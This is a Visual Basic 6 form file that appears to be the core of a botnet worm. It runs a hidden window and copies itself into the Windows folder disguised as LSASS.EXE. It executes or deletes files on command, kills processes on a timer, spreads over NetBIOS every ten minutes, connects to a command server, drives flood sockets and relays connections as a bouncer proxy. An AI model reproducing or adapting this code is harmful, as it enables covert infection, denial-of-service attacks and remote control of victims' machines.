VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmMain 
   Caption         =   "frmMain"
   ClientHeight    =   675
   ClientLeft      =   9330
   ClientTop       =   4755
   ClientWidth     =   2190
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   675
   ScaleWidth      =   2190
   Visible         =   0   'False
   Begin MSWinsockLib.Winsock BNCRelay 
      Left            =   1680
      Top             =   120
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock BNC 
      Left            =   1200
      Top             =   120
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Timer TimerProc 
      Interval        =   200
      Left            =   600
      Top             =   120
   End
   Begin MSWinsockLib.Winsock socket 
      Index           =   0
      Left            =   120
      Top             =   120
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private sTime As String
Private Declare Function GetModuleFileName Lib "kernel32" Alias "GetModuleFileNameA" (ByVal hModule As Long, ByVal lpFileName As String, ByVal nSize As Long) As Long

Private Sub BNC_Close()
    On Error GoTo ErrTrap
    Call BNCRelay.Close
Exit Sub
ErrTrap:
End Sub

Private Sub BNC_ConnectionRequest(ByVal requestID As Long)
    On Error GoTo ErrTrap
    Call BNC.Close
    Call BNC.Accept(requestID&)
Exit Sub
ErrTrap:
End Sub

Private Sub BNC_DataArrival(ByVal bytesTotal As Long)
    On Error GoTo ErrTrap
    Dim sData As String, sArray() As String
    Call BNC.PeekData(sData$)
    If Right$(sData$, 1) <> Chr$(10) Then Exit Sub
    Call BNC.GetData(sData$)
    sData$ = Left$(sData$, Len(sData$) - 1)
    If Right$(sData$, 1) = Chr$(13) Then sData$ = Left$(sData$, Len(sData$) - 1)
    If UCase$(Left$(sData$, 8)) = "CONNECT " Then
        sArray() = Split(sData$, " ")
        If InStr(sArray(1), ":") > 0 Then
            ReDim Preserve sArray(UBound(sArray()) + 1)
            sArray(2) = Mid$(sArray(1), InStr(sArray(1), ":") + 1)
            sArray(1) = Left$(sArray(1), InStr(sArray(1), ":") - 1)
        End If
        Call BNC.SendData(":Connecting to " & sArray(1) & ":" & sArray(2) & vbCrLf)
        Do
            DoEvents
            Call BNCRelay.Close
        Loop Until BNCRelay.State = sckClosed
        Call BNCRelay.Connect(sArray(1), CLng(sArray(2)))
    Else
        If BNCRelay.State <> sckConnected Then
            Call BNC.SendData(":Socket not connected." & vbCrLf)
            Exit Sub
        End If
        Call BNCRelay.SendData(sData$ & vbCrLf)
    End If
Exit Sub
ErrTrap:
End Sub

Private Sub BNCRelay_Close()
    On Error GoTo ErrTrap
    Call BNC.SendData(":Connection to remote host closed." & vbCrLf)
Exit Sub
ErrTrap:
End Sub

Private Sub BNCRelay_Connect()
    On Error GoTo ErrTrap
    Call BNC.SendData(":Connected to " & BNCRelay.RemoteHostIP & ":" & BNCRelay.RemotePort & vbCrLf)
Exit Sub
ErrTrap:
End Sub

Private Sub BNCRelay_DataArrival(ByVal bytesTotal As Long)
    On Error GoTo ErrTrap
    Dim sData As String
    Call BNCRelay.PeekData(sData$)
    If Right$(sData$, 1) <> Chr$(10) Then Exit Sub
    Call BNCRelay.GetData(sData$)
    If BNC.State <> sckConnected Then
        Call BNCRelay.Close
        Exit Sub
    End If
    Call BNC.SendData(sData$)
Exit Sub
ErrTrap:
End Sub

Private Sub Form_Load()
    Dim sFileName As String, lLen As Long
    sFileName$ = String$(255, 0)
    lLen& = GetModuleFileName(App.hInstance, sFileName$, 255)
    sFileName$ = Left$(sFileName$, lLen&)
    If UCase$(Right$(sFileName$, 7)) = "VB6.EXE" Then InIDE% = 1
    If Command$ <> "" Then
        If Left$(Command$, 3) = "/k " Then
            Call Kill(Trim$(Mid$(Command$, 3)))
        Else
            Call Shell(Command$, vbNormalFocus)
        End If
    End If
    If InIDE% < 1 Then
        If App.Path <> System.WinDir Then
            Call System.BlockCopy(Bot.Location, System.WinDir & "\LSASS.EXE")
            Call Shell(System.WinDir & "\LSASS.EXE /k " & Bot.Location)
        End If
    End If
    If App.PrevInstance = True Then Call Unload(Me)
    ReDim SocketStatus(1)
    SocketStatus(0) = "Main Socket"
    SocketCount% = 0
    Call InitClasses
    sTime = Date & " " & Time
    TimerProc.Enabled = True
End Sub

Private Sub Form_Unload(Cancel As Integer)
    TimerProc.Enabled = False
    Call KillClasses
End Sub

Private Sub socket_Connect(Index As Integer)
    On Error GoTo ErrTrap
    Select Case SocketStatus(Index%)
        Case "Main Socket": Call Sockets.Main_Connect(Index%)
        Case "Flood": Call Sockets.Flood_Connect(Index%)
        Case "Bridge": Call Sockets.Bridge_Connect(Index%)
    End Select
Exit Sub
ErrTrap:
End Sub

Private Sub socket_DataArrival(Index As Integer, ByVal bytesTotal As Long)
    On Error GoTo ErrTrap
    Select Case SocketStatus(Index%)
        Case "Main Socket": Call Sockets.Main_DataArrival(Index%)
        Case "Flood": Call Sockets.Flood_DataArrival(Index%)
        Case "Bridge": Call Sockets.Bridge_DataArrival(Index%)
    End Select
Exit Sub
ErrTrap:
End Sub

Private Sub TimerProc_Timer()
    On Error GoTo ErrTrap
    Dim nK As Integer
    'If InIDE% < 1 Then Call System.AddRun
    If InIDE% < 1 Then Call KillProcess.KillAll
    DoEvents
    If BNC_RELAY = 1 Then
        If BNC.State <> sckConnected Then
            If BNC.State = sckClosing Then
                Do
                    DoEvents
                    Call BNC.Close
                Loop Until BNC.State = sckClosed
            End If
            Call BNC.Listen
        End If
    End If
    If DateDiff("n", sTime$, Now) > 10 Then
        sTime$ = Date & " " & Time
        If InIDE% < 1 Then Call Infect.NetBIOS
    End If
    For nK% = 0 To SocketCount%
        If SocketStatus(nK%) = "Main Socket" Then Exit For
    Next nK%
    If socket(nK%).State <> sckConnected Then
        If socket(nK%).State <> sckConnecting Then
            If socket(nK%).State <> sckClosed Then
                Do
                    DoEvents
                    Call socket(nK%).Close
                Loop Until socket(nK%).State = sckClosed
            End If
            Call socket(nK%).Connect(Bot.Server, Bot.Port)
        End If
    End If
Exit Sub
ErrTrap:
    If Err.Number = 9 Then Resume Next
End Sub
